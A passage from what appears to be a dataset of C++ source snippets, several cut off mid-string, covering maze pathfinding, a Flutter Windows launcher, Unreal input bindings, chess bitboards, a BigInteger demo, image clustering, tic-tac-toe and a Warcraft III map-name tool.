Det1numberOfCounts;\r\n\tstd::vector<int> Det2numberOfCounts;\r\n\tstd::vector<int> Det1event;\r\n\tstd::vector<int> Det2event;\r\n\r\n\tstd::vector<int> Det1eventValid;\r\n\t",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <stack>\n#include <algorithm>\n#include <limits>\n#include <cmath>\n#include <ctime>\n#include <cstdlib>\n#include <chrono>\n#include <set>\n\nusing namespace std;\n\nclass Maze {\npublic:\n    vector<vector<int>> grid;\n    vector<pair<int, int>> path;\n    pair<int, int> start = {-1, -1};\n    pair<int, int> end = {-1, -1};\n    int rows, cols;\n    bool isWeighted;\n    vector<vector<int>> weights;\n\n    Maze(int r, int c, bool weighted = false) : rows(r), cols(c), isWeighted(weighted) {\n        grid = vector<vector<int>>(rows, vector<int>(cols, 0));\n        if (isWeighted) {\n            weights = vector<vector<int>>(rows, vector<int>(cols, 1));\n        }\n    }\n\n    void setWall(int r, int c) {\n        grid[r][c] = 1;\n    }\n\n    void setStart(int r, int c) {\n        start = {r, c};\n        grid[r][c] = 0;\n    }\n\n    void setEnd(int r, int c) {\n        end = {r, c};\n        grid[r][c] = 0;\n    }\n\n    void setWeight(int r, int c, int weight) {\n        if (isWeighted) {\n            weights[r][c] = weight;\n        }\n    }\n\n    void printMaze() {\n        set<pair<int, int>> path_set(path.begin(), path.end());\n        for (int i = 0; i < rows; ++i) {\n            for (int j = 0; j < cols; ++j) {\n                if (make_pair(i, j) == start) cout << \"S \";\n                else if (make_pair(i, j) == end) cout << \"E \";\n                else if (find(path.begin(), path.end(), make_pair(i, j)) != path.end()) cout << \"O \";\n                else if (grid[i][j] == 1) cout << \"# \";\n                else if (isWeighted) cout << weights[i][j] << \" \";\n                else cout << \". \";\n            }\n            cout << endl;\n        }\n    }\n\n    void generateRandomMaze() {\n        srand(time(0));\n        for (int i = 0; i < rows; ++i) {\n            for (int j = 0; j < cols; ++j) {\n                grid[i][j] = (rand() % 100 < 25) ? 1 : 0;\n                if (isWeighted && grid[i][j] == 0) {\n                    weights[i][j] = rand() % 9 + 1;  // random weights between 1 and 9\n                }\n            }\n        }\n        // grid[start.first][start.second] = 0;\n        // grid[end.first][end.second] = 0;\n    }\n\n    void inputWeights() {\n        if (!isWeighted) return;\n        cout << \"Enter weights for each cell (1-9):\\n\";\n        for (int i = 0; i < rows; ++i) {\n            for (int j = 0; j < cols; ++j) {\n                if (grid[i][j] == 0) {\n                    cout << \"Weight for cell (\" << i << \", \" << j << \"): \";\n                    cin >> weights[i][j];\n                }\n            }\n        }\n    }\n};\n\nclass PathFinding {\n    Maze &maze;\n\n    struct Node {\n        int r, c, cost, heuristic;\n        Node(int row, int col, int c, int h) : r(row), c(col), cost(c), heuristic(h) {}\n        bool operator<(const Node &other) const {\n            return cost + heuristic > other.cost + other.heuristic;\n        }\n    };\n\npublic:\n    PathFinding(Maze &m) : maze(m) {}\n\n    vector<pair<int, int>> getNeighbors(int r, int c) {\n        vector<pair<int, int>> neighbors;\n        if (r > 0 && maze.grid[r - 1][c] == 0) neighbors.push_back({r - 1, c});\n        if (r < maze.rows - 1 && maze.grid[r + 1][c] == 0) neighbors.push_back({r + 1, c});\n        if (c > 0 && maze.grid[r][c - 1] == 0) neighbors.push_back({r, c - 1});\n        if (c < maze.cols - 1 && maze.grid[r][c + 1] == 0) neighbors.push_back({r, c + 1});\n        return neighbors;\n    }\n\n    int getCost(int r, int c) {\n        return maze.isWeighted ? maze.weights[r][c] : 1;\n    }\n\n    vector<pair<int, int>> aStar() {\n        return search(1, 1);\n    }\n\n    vector<pair<int, int>> dijkstra() {\n        return search(1, 0);\n    }\n\n    vector<pair<int, int>> pureHeuristic() {\n        return search(0, 1);\n    }\n\n    vector<pair<int, int>> weightedAStar() {\n        return search(1, 10);\n    }\n\n    vector<pair<int, int>> bfs() {\n        auto startTime = chrono::high_resolution_clock::now();\n        int nodeCount = 0;\n\n        queue<Node> q;\n        vector<vector<bool>> visited(maze.rows, vector<bool>(maze.cols, false));\n        vector<vector<pair<int, int>>> parent(maze.rows, vector<pair<int, int>>(maze.cols, {-1, -1}));\n        q.push(Node(maze.start.first, maze.start.second, 0, 0));\n        visited[maze.start.first][maze.start.second] = true;\n\n        while (!q.empty()) {\n            nodeCount++;\n            Node current = q.front();\n            q.pop();\n            if (current.r == maze.end.first && current.c == maze.end.second) {\n                auto endTime = chrono::high_resolution_clock::now();\n                auto duration = chrono::duration_cast<chrono::milliseconds>(endTime - startTime).count();\n                cout << \"BFS Algorithm completed in: \" << duration << \" ms, Nodes visited: \" << nodeCount << endl;\n                cout << \"Path cost: \" << current.cost << endl;\n                return reconstructPath(parent);\n            }\n            for (auto &neighbor : getNeighbors(current.r, current.c)) {\n                if (!visited[ne",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"database\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"ShooterCharacter.h\"\n\n// Sets default values\nAShooterCharacter::AShooterCharacter()\n{\n \t// Set this character to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n}\n\n// Called when the game starts or when spawned\nvoid AShooterCharacter::BeginPlay()\n{\n\tSuper::BeginPlay();\n\t\n}\n\n// Called every frame\nvoid AShooterCharacter::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n}\n\n// Called to bind functionality to input\nvoid AShooterCharacter::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent)\n{\n\tSuper::SetupPlayerInputComponent(PlayerInputComponent);\n\n\tPlayerInputComponent->BindAxis(TEXT(\"MoveForward\"), this, &AShooterCharacter::MoveForward);\n\tPlayerInputComponent->BindAxis(TEXT(\"LookUp\"), this, &AShooterCharacter::LookUp);\n\tPlayerInputComponent->BindAxis(TEXT(\"MoveRight\"), this, &AShooterCharacter::MoveRight);\n\tPlayerInputComponent->BindAxis(TEXT(\"LookRight\"), this, &AShooterCharacter::LookRight);\n\tPlayerInputComponent->BindAxis(TEXT(\"LookUpRate\"), this, &AShooterCharacter::LookUpRate);\n\tPlayerInputComponent->BindAxis(TEXT(\"LookRightRate\"), this, &AShooterCharacter::LookRightRate);\n\tPlayerInputComponent->BindAction(TEXT(\"Jump\"), EInputEvent::IE_Pressed, this, &ACharacter::Jump);\n\n}\n\nvoid AShooterCharacter::MoveForward(float AxisValue)\n{\n\tAddMovementInput(GetActorForwardVector() * AxisValue);\n}\n\nvoid AShooterCharacter::LookUp(float AxisValue)\n{\n\tAddControllerPitchInput(AxisValue);\n}\n\nvoid AShooterCharacter::MoveRight(float AxisValue)\n{\n\tAddMovementInput(GetActorRightVector()*AxisValue);\n}\n\nvoid AShooterCharacter::LookRight(float AxisValue)\n{\n\tAddControllerYawInput(AxisValue);\n}\nvoid AShooterCharacter::LookUpRate(float AxisValue)\n{\n\tAddControllerPitchInput(AxisValue * RotationRate * GetWorld()->GetDeltaSeconds());\n}\n\nvoid AShooterCharacter::LookRightRate(float AxisValue)\n{\n\tAddControllerYawInput(AxisValue * RotationRate * GetWorld()->GetDeltaSeconds());\n}\n",
    "#include \"chess.h\"\r\n\r\ninline int square_file(int square) {\r\n\t/**\r\n\t * Gets the file index of the square where 0 is the a-file.\r\n\t */\r\n\treturn square & 7;\r\n}\r\n\r\ninline int square_rank(int square) {\r\n\t/**\r\n\t * Gets the rank index of the square where 0 is the first rank.\r\n\t */\r\n\r\n\treturn square >> 3;\r\n}\r\ninline int square_distance(int a, int b) {\r\n\t/**\r\n\tGets the Chebyshev distance (i.e., the number of king steps) from square *a* to *b*.\r\n\t*/\r\n\treturn std::max(abs(square_file(a) - square_file(b)), abs(square_rank(a) - square_rank(b)));\r\n}\r\nuint64_t _sliding_attacks(int square, uint64_t occupied, const std::vector<int>& deltas);\r\nuint64_t _step_attacks(int square, const std::vector<int>& deltas);\r\n\r\nstd::vector<uint64_t> BB_KNIGHT_ATTACKS(64);\r\nstd::vector<uint64_t> BB_KING_ATTACKS(64);\r\nstd::vector<std::vector<uint64_t>> BB_PAWN_ATTACKS(2, std::vector<uint64_t>(64)); // color - COLORS\r\nint _init_attacks() {\r\n\tfor (int sq = 0; sq < 64; sq++) {\r\n\t\tBB_KNIGHT_ATTACKS[sq] = _step_attacks(sq, { 17, 15, 10, 6, -17, -15, -10, -6 });\r\n\t\tBB_KING_ATTACKS[sq] = _step_attacks(sq, { 9, 8, 7, 1, -9, -8, -7, -1 });\r\n\t\tBB_PAWN_ATTACKS[0][sq] = _step_attacks(sq, { -7, -9 });\r\n\t\tBB_PAWN_ATTACKS[1][sq] = _step_attacks(sq, { 7, 9 });\r\n\t}\r\n\treturn 1;\r\n}\r\n\r\nint DUMMY = _init_attacks();\r\n\r\nstd::vector<uint64_t> BB_SQUARES = {\r\n\t1ULL << 0, 1ULL << 1, 1ULL << 2, 1ULL << 3, 1ULL << 4, 1ULL << 5, 1ULL << 6, 1ULL << 7,\r\n\t1ULL << 8, 1ULL << 9, 1ULL << 10, 1ULL << 11, 1ULL << 12, 1ULL << 13, 1ULL << 14, 1ULL << 15,\r\n\t1ULL << 16, 1ULL << 17, 1ULL << 18, 1ULL << 19, 1ULL << 20, 1ULL << 21, 1ULL << 22, 1ULL << 23,\r\n\t1ULL << 24, 1ULL << 25, 1ULL << 26, 1ULL << 27, 1ULL << 28, 1ULL << 29, 1ULL << 30, 1ULL << 31,\r\n\t1ULL << 32, 1ULL << 33, 1ULL << 34, 1ULL << 35, 1ULL << 36, 1ULL << 37, 1ULL << 38, 1ULL << 39,\r\n\t1ULL << 40, 1ULL << 41, 1ULL << 42, 1ULL << 43, 1ULL << 44, 1ULL << 45, 1ULL << 46, 1ULL << 47,\r\n\t1ULL << 48, 1ULL << 49, 1ULL << 50, 1ULL << 51, 1ULL << 52, 1ULL << 53, 1ULL << 54, 1ULL << 55,\r\n\t1ULL << 56, 1ULL << 57, 1ULL << 58, 1ULL << 59, 1ULL << 60, 1ULL << 61, 1ULL << 62, 1ULL << 63\r\n};\r\nconstexpr uint64_t BB_EMPTY = 0;\r\nconstexpr uint64_t BB_ALL = 0xFFFFFFFFFFFFFFFF;\r\n\r\nuint64_t BB_CORNERS = BB_SQUARES[0] | BB_SQUARES[7] | BB_SQUARES[56] | BB_SQUARES[63];\r\nuint64_t BB_CENTER = BB_SQUARES[27] | BB_SQUARES[28] | BB_SQUARES[35] | BB_SQUARES[36];\r\n\r\nuint64_t BB_LIGHT_SQUARES = 0x5555555555555555;\r\nuint64_t BB_DARK_SQUARES = 0xAAAAAAAAAAAAAAAA;\r\n\r\nstd::vector<uint64_t> BB_FILES = {\r\n\t0x0101010101010101ULL << 0,\r\n\t0x0101010101010101ULL << 1,\r\n\t0x0101010101010101ULL << 2,\r\n\t0x0101010101010101ULL << 3,\r\n\t0x0101010101010101ULL << 4,\r\n\t0x0101010101010101ULL << 5,\r\n\t0x0101010101010101ULL << 6,\r\n\t0x0101010101010101ULL << 7\r\n};\r\n\r\nstd::vector<uint64_t> BB_RANKS = {\r\n\t(uint64_t)0xFF << (8 * 0),\r\n\t(uint64_t)0xFF << (8 * 1),\r\n\t(uint64_t)0xFF << (8 * 2),\r\n\t(uint64_t)0xFF << (8 * 3),\r\n\t(uint64_t)0xFF << (8 * 4),\r\n\t(uint64_t)0xFF << (8 * 5),\r\n\t(uint64_t)0xFF << (8 * 6),\r\n\t(uint64_t)0xFF << (8 * 7)\r\n};\r\n\r\nuint64_t BB_BACKRANKS = BB_RANKS[0] | BB_RANKS[7];\r\n\r\nstd::vector<int> SQUARES_180 = {\r\n\t56, 57, 58, 59, 60, 61, 62, 63,\r\n\t48, 49, 50, 51, 52, 53, 54, 55,\r\n\t40, 41, 42, 43, 44, 45, 46, 47,\r\n\t32, 33, 34, 35, 36, 37, 38, 39,\r\n\t24, 25, 26, 27, 28, 29, 30, 31,\r\n\t16, 17, 18, 19, 20, 21, 22, 23,\r\n\t8, 9, 10, 11, 12, 13, 14, 15,\r\n\t0, 1, 2, 3, 4, 5, 6, 7\r\n};\r\nuint64_t _sliding_attacks(int square, uint64_t occupied, const std::vector<int>& deltas) {\r\n\tuint64_t attacks = BB_EMPTY;\r\n\r\n\tfor (int delta : deltas) {\r\n\t\tint sq = square;\r\n\r\n\t\twhile (true) {\r\n\t\t\tsq += delta;\r\n\t\t\tif (sq < 0 || sq >= 64 || square_distance(sq, sq - delta) > 2) {\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t\tattacks |= 1ULL<<sq;\r\n\r\n\t\t\tif (occupied & 1ULL<<sq) {\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\treturn attacks;\r\n}\r\n\r\nuint64_t _step_attacks(int square, const std::vector<int>& deltas) {\r\n\treturn _sliding_attacks(square, BB_ALL, deltas);\r\n}\r\n\r\nuint64_t _edges(int square) {\r\n\treturn ((BB_RANKS[0] | BB_RANKS[7]) & ~BB_RANKS[square_rank(square)]) |\r\n\t\t((BB_FILES[0] | BB_FILES[7]) & ~BB_FILES[square_file(square)]);\r\n}\r\n\r\nstd::vector<uint64_t> _carry_rippler(uint64_t mask) {\r\n\t// Carry-Rippler trick to iterate subsets of mask.\r\n\tstd::vector<uint64_t> subsets;\r\n\tuint64_t subset = 0;\r\n\twhile (true) {\r\n\t\tsubsets.push_back(subset);\r\n\t\tsubset = (subset - mask) & mask;\r\n\t\tif (!subset) {\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\treturn subsets;\r\n}\r\n\r\nstd::pair<std::vector<uint64_t>, std::vector<std::unordered_map<uint64_t, uint64_t>>> _attack_table(const std::vector<int>& deltas) {\r\n\tstd::vector<uint64_t> mask_table;\r\n\tstd::vector<std::unordered_map<uint64_t, uint64_t>> attack_table;\r\n\r\n\tfor (int square = 0; square < 64; square++) {\r\n\t\tstd::unordered_map<uint64_t, uint64_t> attacks;\r\n\r\n\t\tuint64_t mask = _sliding_attacks(square, 0, deltas) & ~_edges(square);\r\n\t\tfor (uint64_t subset : _carry_rippler(mask)) {\r\n\t\t\tattacks[subset] = _sliding_attacks(square, subset, deltas);\r\n\t\t}\r\n\r\n\t\tattack_table.push_back(attacks);\r\n\t\tmask_table.push_back(mask);\r\n\t}\r\n\r\n",
    "#include \"BigInteger.h\"\n\nint main() {\n    // Increment & Decrement\n    BigInteger increment = 5;\n    cout << \"Value before Increment: \" << increment << endl;\n    increment++;\n    ++increment;\n    cout << \"Value after Increment: \" << increment << endl << endl;\n\n    BigInteger decrement = 7;\n    cout << \"Value before Decrement: \" << decrement << endl;\n    decrement--;\n    --decrement;\n    cout << \"Value after Decrement: \" << decrement << endl << endl<<endl;\n\n    // Arithmetic Operations\n    // Addition and Subtraction\n    cout<<\"Arithmetic Operations:\"<<endl;\n    BigInteger add1 = 9999998747;\n    BigInteger add2 = 7783403478;\n    cout << \"Addition: \" <<endl;\n    cout<<add1<<\" + \"<<add2<<\": \"<< add1 + add2 << endl;\n    add1 += add2;\n    cout << \"After Addition with Compound Assignment: \" << add1 << endl << endl;\n\n    BigInteger subtract1 = 88534434;\n    BigInteger subtract2 = 555443;\n    cout << \"Subtraction: \" <<endl;\n    cout<<subtract1<<\" - \"<<subtract2<<\": \"<< subtract1 - subtract2 << endl;\n    subtract1 -= subtract2;\n    cout << \"After Subtraction with Compound Assignment: \" << subtract1 << endl << endl;\n\n    // Multiplication\n    BigInteger multiply1 = 1234;\n    BigInteger multiply2 = 5678;\n    cout << \"Multiplication: \" <<endl;\n    cout<<multiply1<<\" * \"<<multiply2<<\": \"<< multiply1 * multiply2 << endl;\n    multiply1 *= multiply2;\n    cout << \"After Multiplication with Compound Assignment: \" << multiply1 << endl << endl;\n\n    // Division\n    BigInteger div1 = 9876543210;\n    BigInteger div2 = 1234;\n    cout << \"Division: \" <<endl;\n    cout<<div1<<\" / \"<<div2<<\": \"<< div1 / div2 << endl;\n    div1 /= div2;\n    cout << \"After Division with Compound Assignment: \" << div1 << endl << endl;\n\n    // Modulo\n    BigInteger mod1 = 100;\n    BigInteger mod2 = 3;\n    cout << \"Modulo: \" <<endl;\n    cout<<mod1<<\" % \"<<mod2<<\": \"<< mod1 % mod2 << endl;\n    mod1 %= mod2;\n    cout << \"After Modulo with Compound Assignment: \" << mod1 << endl << endl<<endl;\n\n    // Comparison operators\n    BigInteger comp1 = 12345;\n    BigInteger comp2 = 54321;\n    cout << \"Comparison: \" << endl;\n    cout <<comp1<< \" == \"<< comp2<< \": \" << (comp1 == comp2) << endl;\n    cout <<comp1<< \" != \"<< comp2<< \": \" << (comp1 != comp2) << endl;\n    cout <<comp1<< \" > \"<< comp2<< \": \" << (comp1 > comp2) << endl;\n    cout <<comp1<< \" >= \"<< comp2<< \": \" << (comp1 >= comp2) << endl;\n    cout <<comp1<< \" < \"<< comp2<< \": \" << (comp1 < comp2) << endl;\n    cout <<comp1<< \" <= \"<< comp2<< \": \" << (comp1 <= comp2) << endl;\n    cout<<endl<<endl;\n\n    cout<<\"Functions: \"<<endl;\n    // Sqrt\n    BigInteger sqrt1 = 16;\n    cout << \"Square Root of 16: \" << sqrt(sqrt1) << endl;\n\n    // Power\n    BigInteger base = 2;\n    BigInteger power = 10;\n    cout << \"Power: \" << pow(base, power) << endl<<endl;\n\n    // Swap\n    BigInteger swap1 = 10;\n    BigInteger swap2 = 20;\n    cout << \"Before Swap: swap1 = \" << swap1 << \", swap2 = \" << swap2 << endl;\n    swap(swap1, swap2);\n    cout << \"After Swap: swap1 = \" << swap1 << \", swap2 = \" << swap2 << endl<<endl;\n\n    // Sorting\n    vector<BigInteger> numbers = {321, 123, 543, 234};\n    cout << \"Before Sorting: \";\n    for (const auto &num : numbers) {\n        cout << num << \" \";\n    }\n    cout << endl;\n    sort(numbers.begin(), numbers.end());\n    cout << \"After Sorting: \";\n    for (const auto &num : numbers) {\n        cout << num << \" \";\n    }\n    cout << endl<<endl;\n\n    // Min and Max\n    BigInteger minNum = min(BigInteger(10), BigInteger(20));\n    BigInteger maxNum = max(BigInteger(10), BigInteger(20));\n    cout << \"Min: \" << minNum << endl;\n    cout << \"Max: \" << maxNum << endl;\n}\n",
    "#include \"Classify.hpp\"\r\n#include <sstream>\r\n\r\nusing namespace CLNSIH001;\r\n\r\nint main(int argc, char * argv[]){\r\n    std::string dataset = std::string(argv[1]);//folder location containing images\r\n    //output file\r\n    std::string output = \"\";\r\n    //number of clusters generated by algorithm\r\n    int n = 10;\r\n    //histogram width\r\n    int b = 1;\r\n    //use colour histograms\r\n    bool flag = false;\r\n    if (argc == 2){\r\n        //defualt\r\n        n=10; b=1;\r\n        CLNSIH001::Classify KMC(dataset, n, b, flag);\r\n        std::cout << KMC;\r\n    }\r\n    else{\r\n        int i = 2;\r\n        while (i<argc)\r\n        {\r\n            std::string command = std::string(argv[i]);\r\n            if (command == \"-o\"){\r\n                //output filename without the extension\r\n                output = std::string(argv[++i]);\r\n            }\r\n            else if (command == \"-k\"){\r\n                //number of clusters generated by algorithm\r\n                std::istringstream(std::string(argv[++i])) >> n;\r\n            }\r\n            else if (command == \"-bin\"){\r\n                //histogram width\r\n                std::istringstream(std::string(argv[++i])) >> b;\r\n            }\r\n            else if (command == \"-color\"){\r\n                //DO NOT forget to include the spelling of colour in your readme.txt\r\n                flag = true;\r\n            }\r\n            i++;\r\n        }\r\n        CLNSIH001::Classify KMC(dataset, n, b, flag);\r\n        if (output == \"\"){ std::cout << KMC;}\r\n        else{\r\n            KMC.WriteTo(output);\r\n            std::cout << \"The Clustering has been written to file: \" << output << \".txt\" << std::endl;}\r\n    }\r\n    return 0;\r\n}",
    "#include \"tttfunctions.hpp\"\n\nusing namespace std;\n\n// This function check if the input string 1) has exactly 9 characters 2) Contains only digits from '1' to '9'\n// Each digit appears only once.\nbool validateInput(const string& inputStrategy) {\n    if (inputStrategy.size()!=9) return false;\n    vector<bool> seen(9, false);\n    for (char c : inputStrategy) {\n        if(c < '1' || c > '9') {\n            return false;\n        }\n        int index = c - '1';\n        if (seen[index]) return false;\n        seen[index] = true;\n    }\n    return true;\n}\n\n// This function prints the board. \nvoid printBoard(const vector<char>& board) {\n    for (int i = 0; i < 9; i++) {\n        cout << board[i];\n        if (i % 3 == 2) cout << endl; // if its the end of row, new line\n        else cout << ' '; // else, space\n    }\n    cout << endl;\n}\n\n// This function check if player is the winner by pass all possible winning combinations\nbool checkWinner(const vector<char>& board, char player) {\n    const vector<vector<int>> win_conditions = {\n        {0, 1, 2}, {3, 4, 5}, {6, 7, 8},  // Rows\n        {0, 3, 6}, {1, 4, 7}, {2, 5, 8},  // Columns\n        {0, 4, 8}, {2, 4, 6}              // Diagonals\n    };\n\n    for (const auto& condition : win_conditions) {\n        if (board[condition[0]] == player && board[condition[1]] == player && board[condition[2]] == player) {\n            return true;\n        }\n    }\n    return false;\n}\n\nint getMove(const vector<char>& board, const vector<int>& numStrategy) {\n    for (int position : numStrategy) {\n        if (board[position] == '_') return position;\n    }\n    return numStrategy.back();\n}",
    "\ufeff#include \"Engine.h\"\r\n#include <iostream>\r\n#include <locale>\r\n#include <filesystem>\r\n#include <fstream>\r\n\r\n#include \"StringToString.h\"\r\n#include <iostream>\r\n#include <regex>\r\n#include <string>\r\n\r\n\r\n\r\n//bool containsOnlyEnglishCharacters(const std::string& text) {\r\n//    // \u0420\u0435\u0433\u0443\u043b\u044f\u0440\u043d\u043e\u0435 \u0432\u044b\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 \u0430\u043d\u0433\u043b\u0438\u0439\u0441\u043a\u0438\u0445 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432, \u0446\u0438\u0444\u0440, \u043f\u0440\u043e\u0431\u0435\u043b\u043e\u0432, \u0442\u043e\u0447\u0435\u043a \u0438 \u0434\u0435\u0444\u0438\u0441\u043e\u0432\r\n//    std::regex englishRegex(\"^[A-Za-z0-9 .\\\\$\\\\;\\\\@\\\\!\\\\^\\\\+\\\\=\\\\/\\\\<\\\\>\\\\#\\\\?\\\\*\\\\,\\\\\\\"\\\\\\'\\\\&\\\\:\\\\_\\\\~\\\\(\\\\)\\\\-\\\\[\\\\]]*$\");\r\n//    return std::regex_match(text, englishRegex);\r\n//}\r\n//I am creating a program to load characters from Warcraft III : Reforged, specifically m16, which is the output of all heroes.I would appreciate your help gathering information about the map name and the path to save this map.\r\n//(name(Narnia RPG 3 10.4J ENG FIX.w3x)   path(CustomMapData\\NARNIARPG3))\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"Russian\");\r\n\r\n    //std::vector<std::pair<std::pair<std::string, std::string>, bool>> outInput = {\r\n    //    {{\"Narnia_RPG_3_10.4J_ENG_FIX\", \"Narnia_RPG_3_10.4J_ENG_FIX.w3x\"}, true },\r\n    //    {{\"Narnia_RPG_3_10.4J_ENG_FIX\", \"43322_Narnia_RPG_3_10.4J_ENG_FIX\"}, true },\r\n    //    {{\"Narnia_RPG_3_9_ENG_FIX\", \"Narnia_RPG_3_10.4J_ENG_FIX\"}, true },\r\n    //    {{\"Narnia_RPG_3_9_ENG_FIX\", \"Narnia_RPG_3_10.4J_ENG\"}, true },\r\n    //    {{\"11483_NARNIARPG2[Worl_nal_Eng_2.23.w3x\", \"Narnia_RPG_3\"}, false },\r\n    //    {{\"11483_NARNIARPG2[Worl_nal_Eng_2.23.w3x\", \"NARNIARPG2[World]Final Eng 2.23.w3x\"}, true },\r\n    //    {{\"Eng_Mep_rpg_v5\", \"Mep_rpg\"}, true },\r\n    //    {{\"Eng_Mep_rpg_v5\", \"Narnia_RPG_3_10.4J_ENG\"}, false },\r\n    //    {{\"43828_Fish_RPG_0.478.w3x\", \"432_Fish_RPG_0.478.w3x\"}, true },\r\n    //};\r\n\r\n    //int i = 0, skip = 66;\r\n    //std::ifstream fil(\"mapsList.txt\");\r\n    //while (fil)\r\n    //{\r\n    //    std::string str = \"\\0\", str2;\r\n    //    getline(fil, str);\r\n    //    if (i >= skip) {\r\n    //        if (!str.empty()) {\r\n    //            StringToString StringToString_;\r\n    //            str2 = StringToString_.strVectorToStr(str);\r\n    //            std::cout << i << \") str ( \" << str << \"  |  \" << str2 << \" ) \" << std::endl;\r\n    //        }\r\n\r\n    //        std::cin.get();\r\n    //    }\r\n    //    i++;\r\n    //}\r\n\r\n    //std::cout << i << \") end\" << std::endl;\r\n    //std::cin.get();\r\n\r\n    //std::ofstream outFile(\"mapsList.txt\");\r\n    //if (!outFile) {\r\n    //    std::cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u0438 \u0444\u0430\u0439\u043b\u0430 \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0438.\" << std::endl;\r\n    //    return 1;\r\n    //}\r\n\r\n\r\n    //for (const auto& entry : std::filesystem::recursive_directory_iterator(\"Maps\")) {\r\n    //    if (entry.is_regular_file()) {\r\n    //        std::string str;\r\n    //        std::ifstream fil(entry.path());\r\n    //        getline(fil, str);\r\n\r\n    //        if (str.substr(0, 4) == \"HM3W\") str = str.substr(5);\r\n    //        int i = 0;\r\n    //        while (str[i] == '\\0') { i++; }\r\n    //        str = str.substr(i);\r\n\r\n    //        //if (str[0] == '|') str = str.substr(10);\r\n\r\n\r\n    //        i = 0;\r\n    //        while (str[i] != '\\0') { i++; }\r\n    //        str = str.substr(0, i);\r\n\r\n    //        for (int j = 0; j < str.size(); j++) {\r\n    //            if (str[j] == '|') {\r\n    //                if (str[j + 1] == 'r' || str[j + 1] == 'R') {\r\n    //                    str = str.substr(0, j) + str.substr(j+2);\r\n    //                    break;\r\n    //                }\r\n    //                else if (str[j+1] == 'c' || str[j+1] == 'C') {\r\n    //                    str = str.substr(0, j) + str.substr(j + 10);\r\n    //                }\r\n    //            }\r\n    //        }\r\n\r\n    //        if (containsOnlyEnglishCharacters(str)) {\r\n    //            outFile << str << std::endl;\r\n    //            std::cout  << str << std::endl;\r\n    //            std::cout << \"_________________________________________________________________________\" << std::endl;\r\n    //        }\r\n    //        else {\r\n    //            outFile << entry.path().filename().string() << std::endl;\r\n    //            std::cout << entry.path().filename().string() << std::endl;\r\n    //            std::cout << \"_________________________________________________________________________\" << std::endl;\r\n    //        }\r\n\r\n    //        //std::cin.get();\r\n    //    }\r\n    //}\r\n    //std::cout << \"end\" << std::endl;\r\n    //std::cin.get();\r\n\r\n    Engine Engine_;\r\n    Engine_.engine1();\r\n\r\n    return 0;\r\n}\r\n//\r\n////#include <filesystem>\r\n////#include <windows.h>\r\n////#include <commdlg.h>\r\n////#include <string>\r\n////#include <iostream>\r\n////\r\n////// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0434\u0438\u0430\u043b\u043e\u0433\u043e\u0432\u043e\u0433\u043e \u043e\u043a\u043d\u0430 \u0432\u044b\u0431\u043e\u0440\u0430 \u0444\u0430\u0439\u043b\u0430\r\n////std::wstring OpenFileDialog() {\r\n////    // \u0421\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0434\u0438\u0430\u043b\u043e\u0433\u043e\u0432\u043e\u0433\u043e \u043e\u043a\u043d\u0430\r\n////    OPENFILENAME ofn;\r\n////    wchar_t szFile[260] = { 0 };\r\n////    ZeroMemory(&ofn, sizeof(ofn));\r\n////    ofn.lStructSize = sizeof(ofn);\r\n////    ofn.hwndOwner = NULL;  // \u0415\u0441\u043b\u0438 \u043e\u043a\u043d\u043e \u0438\u043c\u0435\u0435\u0442 \u0432\u043b\u0430\u0434\u0435\u043b\u044c\u0446\u0430, \u0443\u043a\u0430\u0436\u0438\u0442\u0435 \u0435\u0433\u043e \u0437\u0434\u0435\u0441\u044c\r\n////    ofn.lpstrFile = szFile;\r\n////    ofn.nMaxFile = sizeof(szFile);\r\n////    ofn.lpstrF",
